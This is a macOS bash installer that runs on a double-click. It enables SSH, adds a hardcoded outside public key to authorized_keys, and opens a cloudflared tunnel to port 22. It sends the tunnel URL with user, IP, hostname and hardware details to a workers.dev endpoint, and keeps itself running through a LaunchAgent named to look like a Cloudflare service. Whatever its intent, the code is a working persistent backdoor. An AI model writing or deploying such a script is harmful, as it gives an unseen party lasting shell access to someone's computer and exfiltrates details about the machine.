#!/bin/bash
# ============================================
# DAVID'S MAC — Double-click = Done
# 0 secrets | SSH + CF Tunnel + auto-report
# ============================================
clear
echo "=========================================="
echo "  Setting up remote access..."
echo "=========================================="

KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFi38QEU6BlyGvfozRqZh9VKynr51NwUMjUHMOdmM5Gj export@vietnam-plywood.com"
API="https://mac-nodes.dmd-fami.workers.dev"

# 1. Homebrew
if ! command -v brew &>/dev/null; then
  echo "[1/5] Installing Homebrew..."
  NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/opt/homebrew/bin/brew shellenv)"
else echo "[1/5] Homebrew OK"; fi

# 2. SSH + key
echo "[2/5] Enabling SSH..."
sudo systemsetup -setremotelogin on 2>/dev/null
mkdir -p ~/.ssh && chmod 700 ~/.ssh
grep -qF "$KEY" ~/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3. Cloudflared
echo "[3/5] Installing cloudflared..."
brew install cloudflared 2>/dev/null

# 4. Tunnel wrapper (auto-report URL on start/restart)
echo "[4/5] Creating tunnel..."
WRAPPER="$HOME/tunnel-wrapper.sh"
cat > "$WRAPPER" << 'WEOF'
#!/bin/bash
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
USER=$(whoami)
LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
OS=$(sw_vers -productVersion)
MODEL=$(sysctl -n hw.model 2>/dev/null)
RAM=$(($(sysctl -n hw.memsize 2>/dev/null) / 1073741824))GB

cloudflared tunnel --url ssh://localhost:22 2>&1 | while read line; do
  echo "$line"
  URL=$(echo "$line" | grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com')
  if [ -n "$URL" ]; then
    curl -s -X POST "$API/register" \
      -H "Content-Type: application/json" \
      -d "{\"user\":\"$USER\",\"lan_ip\":\"$LAN\",\"tunnel_url\":\"$URL\",\"hostname\":\"$HOST\",\"macos\":\"$OS\",\"model\":\"$MODEL\",\"ram\":\"$RAM\"}"
  fi
done
WEOF
chmod +x "$WRAPPER"

# 5. LaunchAgent (auto-start on login)
echo "[5/5] Installing service..."
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.cloudflare.tunnel.plist << PEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.cloudflare.tunnel</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>${HOME}/tunnel-wrapper.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/cf-tunnel.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/cf-tunnel.log</string>
</dict>
</plist>
PEOF
launchctl load ~/Library/LaunchAgents/com.cloudflare.tunnel.plist 2>/dev/null

# Chờ tunnel URL
echo ""
echo "Waiting for tunnel URL..."
for i in {1..30}; do
  TUNNEL_URL=$(grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com' /tmp/cf-tunnel.log 2>/dev/null | tail -1)
  if [ -n "$TUNNEL_URL" ]; then break; fi
  sleep 2
done

MY_USER=$(whoami)
MY_LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
MY_HOST=$(scutil --get ComputerName 2>/dev/null || hostname)

echo ""
echo "============================================"
echo "  DONE!"
echo "  Tunnel: ${TUNNEL_URL:-pending...}"
echo "  LAN:    ssh $MY_USER@$MY_LAN"
echo "  Host:   $MY_HOST"
echo "  Auto-start on reboot: YES"
echo "============================================"
read -p "Press Enter to close..."
